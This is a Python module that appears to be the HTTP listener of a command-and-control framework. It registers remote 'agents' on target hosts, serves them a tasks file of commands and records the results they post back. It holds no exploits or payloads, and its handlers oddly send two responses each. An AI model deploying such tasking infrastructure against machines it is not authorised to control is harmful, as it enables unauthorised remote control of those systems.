#!/usr/bin/python3

from .agent import Agent
import cgi
from uuid import uuid4
from .agents_helpers import add_agent, write_results


def register_agent(self):
    self.send_response(200)
    self.send_header('content-type', 'text/html')
    # Always have to close the header.
    self.end_headers()
    output = ''
    # Add opening html body tags
    output += '<html><body>'
    output += '<h1>Register</h1>'

    # Create new form
    output += '<form method="POST" enctype="multipart/form-data" action="/reg">'
    output += '<input name="hostname" type="text" placeholder="Target Host Name">'
    output += '<input type="submit" value="Add">'
    output += '<input name="os type" type="text" placeholder="Target OS">'
    output += '<input type="submit" value="Add">'
    output += '<input name="os version" type="text" placeholder="Target OS Version">'
    output += '<input type="submit" value="Add">'
    output += '</form>'
    output += '</body></html>'

    self.wfile.write(output.encode())
    # ctype = content type, pdict = parameter dictionary
    # ctype will scan the above code within /new if block, it will see
    # enctype="multipar/form-data" and add that to the value of ctype
    # the input data is then added to the pdict.
    ctype, pdict = cgi.parse_header(self.headers.get('content-type'))
    pdict['boundary'] = bytes(pdict['boundary'], "utf-8")
    # Obtain content length of post that is being submitted.
    content_len = int(self.headers.get('Content-length'))
    pdict['CONTENT_LENGTH'] = content_len
    if ctype == 'multipart/form-data':
        # This reads each part of the form
        fields = cgi.parse_multipart(self.rfile, pdict)
        # Grab the "task" field that was input by the post request.\
        uuid = uuid4()
        
        ip_port = self.client_address
        (tgt_ip, tgt_port) = ip_port
        tgt_hostname = fields.get('hostname')
        tgt_os = fields.get('os type')
        tgt_os_version = fields.get('os version')

        new_agent = Agent(self.listener.name, str(uuid), tgt_ip, tgt_hostname[0], tgt_os[0], tgt_os_version[0])
        add_agent(new_agent)

        self.send_response(201, f"@{uuid}")
        # Always have to close the header.
        self.end_headers()


def collect_results(self, agent):
    self.send_response(200)
    self.send_header('content-type', 'text/html')
    # Always have to close the header.
    self.end_headers()

    output = ''
    # Add opening html body tags
    output += '<html><body>'
    output += '<h1>Register</h1>'

    # Create new form
    output += '<form method="POST" enctype="multipart/form-data" action="/reg">'
    output += '<input name="task id" type="text" placeholder="Task ID">'
    output += '<input type="submit" value="Add">'
    output += '<input name="task cmd" type="text" placeholder="Task cmd">'
    output += '<input type="submit" value="Add">'
    output += '<input name="task results" type="text" placeholder="Task Results">'
    output += '<input type="submit" value="Add">'
    output += '</form>'
    output += '</body></html>'

    self.wfile.write(output.encode())
    # ctype = content type, pdict = parameter dictionary
    # ctype will scan the above code within /new if block, it will see
    # enctype="multipar/form-data" and add that to the value of ctype
    # the input data is then added to the pdict.
    ctype, pdict = cgi.parse_header(self.headers.get('content-type'))
    pdict['boundary'] = bytes(pdict['boundary'], "utf-8")
    # Obtain content length of post that is being submitted.
    content_len = int(self.headers.get('Content-length'))
    pdict['CONTENT_LENGTH'] = content_len
    if ctype == 'multipart/form-data':
        # This reads each part of the form
        fields = cgi.parse_multipart(self.rfile, pdict)
        # Grab the "task" field that was input by the post request.
        task_id = fields.get('task id')
        task_cmd = fields.get('task cmd')
        task_results = fields.get('task results')

        write_results(task_id[0], task_cmd[0], task_results[0], agent)

        self.send_response(201)
        self.end_headers()


def serve_tasks(self, agent):
    self.send_response(200)
    self.send_header('Content-type', 'text/html')
    self.send_header('Content-Disposition', 'attachment; filename="tasks.txt"')
    self.end_headers()

    with open(agent.tasks_path, 'rb') as file:
        self.wfile.write(file.read())


